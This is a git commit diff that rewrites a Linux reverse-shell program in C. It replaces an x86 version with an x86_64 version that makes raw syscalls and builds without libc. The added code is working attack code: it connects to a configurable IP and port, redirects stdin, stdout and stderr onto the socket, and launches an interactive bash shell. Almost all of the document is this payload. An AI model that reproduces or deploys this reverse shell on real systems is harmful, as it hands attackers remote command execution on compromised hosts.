7d96055275fba9a4e6f6ab48e23c107749149a67
Matheus <mmedeiros450@gmail.com>
2019-03-31 02:03:29 -0300

    update reverse-shell-x86_64-static.c

--- linux/reverse-shell-x86_64-static.c
+++ linux/reverse-shell-x86_64-static.c
@@ -1,124 +1,84 @@
-/*
- * Coded by MMxM
- * [root@hc0d3r C]$ date
- * Sáb Mar 28 15:23:54 BRT 2015
- * [root@hc0d3r C]$ gcc -Wall -Wextra -m32 -o linux-reverse linux-reverse.c
-*/
+// gcc -m64 -nostdlib -fno-stack-protector reverse-shell-x86_64-static.c -o reverse-shell
 
-#define IP "127.0.0.1"
-#define PORT 31337
-#define call "int $0x80"
-#define puts(x) write(1, x);
-#define shell "/bin/bash"
+#ifndef IP
+ #define IP "127.0.0.1"
+#endif
 
-static char *args[] = { "bash", "-i", 0 };
+#ifndef PORT
+ #define PORT 31337
+#endif
 
-struct addr_in {
-	short family;
-	unsigned short port;
-	unsigned long ip;
-	char zero[8];
-};
+#include <asm/unistd.h>
+#include <sys/socket.h>
+#include <arpa/inet.h>
+#include <netinet/in.h>
 
-int execve(const char *filename, char *const argv[], char *const envp[]){
-	int ret;
-	__asm__ volatile( call : "=a" (ret): "a" (11), "b" (filename), "c" (argv), "d" (envp) : "memory" );
-	return ret;
+// capiroto macro
+#define syscall(n, x...) _syscall(__NR_, n, x)
+#define _syscall(p, n, x...) _raw_syscall(p##n, x)
+
+// syscall list
+#define socket(domain, type, prot) syscall(socket, domain, type, prot)
+#define execve(path, argv, envp) syscall(execve, path, argv,envp)
+#define connect(fd, addr, len) syscall(connect, fd, addr, len)
+#define write(fd, ptr, len) syscall(write, fd, ptr, len)
+#define dup2(fd, fd2) syscall(dup2, fd, fd2)
+#define exit(n) syscall(exit, n)
+
+
+
+__attribute__ ((naked)) long _raw_syscall(unsigned long n, ...){
+    asm("mov %rdi, %rax\n"
+        "mov %rsi, %rdi\n"
+        "mov %rdx, %rsi\n"
+        "mov %rcx, %rdx\n"
+        "mov %r8, %r10\n"
+        "mov %r9, %r8\n"
+        "mov 0x8(%rsp), %r9\n"
+        "syscall\n"
+        "ret\n");
 }
 
-int dup2(int oldfd, int newfd){
-	int ret;
-	__asm__ volatile( call : "=a" (ret) : "a" (63), "b" (oldfd), "c" (newfd) : "memory" );
-	return ret;
+int ip2int(const char *str){
+    int ret = 0, aux = 0;
+    char c;
+
+    while((c = *str++)){
+        if(c == '.'){
+            ret |= aux;
+            ret <<= 8;
+            aux = 0;
+        } else {
+            aux *= 10;
+            aux += c-'0';
+        }
+    }
+
+    return __bswap_32(ret|aux);
 }
 
-int connect(unsigned long ip, unsigned short port){
-	unsigned long x[3], ret, con[3];
-	static struct addr_in address;
-	int socket_fd;
+void _start(void){
+    struct sockaddr_in addr;
+    const char *argv[]={"bash", "-i", 0L};
 
-	x[0]=2;x[1]=1;x[2]=0;
-
-	__asm__ volatile( call : "=a" (socket_fd) : "a" (0x66), "b" (1) , "c" (x) : "memory" );
-
-	if(socket_fd < 0)
-		return -1;
-
-	address.family = 2;
-	address.port = (unsigned short) ((port & 0xff) << 8 | (port & 0xff00) >> 8);
-	address.ip = ip;
-
-	con[0]=socket_fd;
-	con[1]=(unsigned long)&address;
-	con[2]=16;
-
-	__asm__ volatile( call : "=a" (ret) : "a" (0x66), "b" (3), "c" (con) : "memory" );
-
-	return (!ret) ? (int)socket_fd : -1;
-}
-
-void write(int fd, const char *x){
-	int i;
-
-	for(i=0; x[i]; i++);
-	__asm__ volatile( call :: "a" (4), "b" (fd), "c" (x), "d" (i) : "memory" );
-
-}
-
-int ip2long(const char *str, unsigned long *output){
-	int X=0, pos=0, ipv4[4]={0};
-	while(*str){
-		if( (*str == '.' && X == 0) || pos == 4 || X == 4){
-			return 0;
-		}
-
-		if(*str=='.'){
-			X=0;
-			pos++;
-		}
-
-		else if(*str >= '0' || *str <= '9'){
-			ipv4[pos] *= 10;
-			ipv4[pos] += *str-'0';
-			X++;
-		}
-
-		str++;
-	}
-
-	if(!X) return 0;
-
-	for(X=0;X<4;X++)
-		if(ipv4[X] > 0xff)
-			return 0;
-
-	*output = (ipv4[3] << 24 | ipv4[2] << 16 | ipv4[1] << 8 | ipv4[0]);
-
-	return 1;
-
-}
+    int fd = socket(AF_INET, SOCK_STREAM, 0);
+    if(fd < 0)
+        goto end;
 
 
-int main(void){
-	unsigned long ip;
-	int sock_fd = 0;
+    addr.sin_family = AF_INET;
+    addr.sin_addr.s_addr = ip2int(IP);
+    addr.sin_port = __bswap_16(PORT);
 
-	if(!ip2long(IP, &ip)){
-		puts("Invalid IP !!!\n");
-		return 0;
-	}
+    if(connect(fd, &addr, sizeof(struct sockaddr_in)) < 0)
+        goto end;
 
-	if( (sock_fd = connect(ip, PORT)) == -1) {
-		puts("failed to connect\n");
-		return 0;
-	}
+    dup2(fd, 0);
+    dup2(fd, 1);
+    dup2(fd, 2);
 
-	dup2(sock_fd, 0);
-	dup2(sock_fd, 1);
-	dup2(sock_fd, 2);
+    execve("/bin/bash", argv, 0L);
 
-	puts("\n[+] Reverse shell coded by MMxM (Linux x86)\n\n");
-	execve(shell, args , 0);
-
-	return 0;
+    end:
+    exit(0);
 }
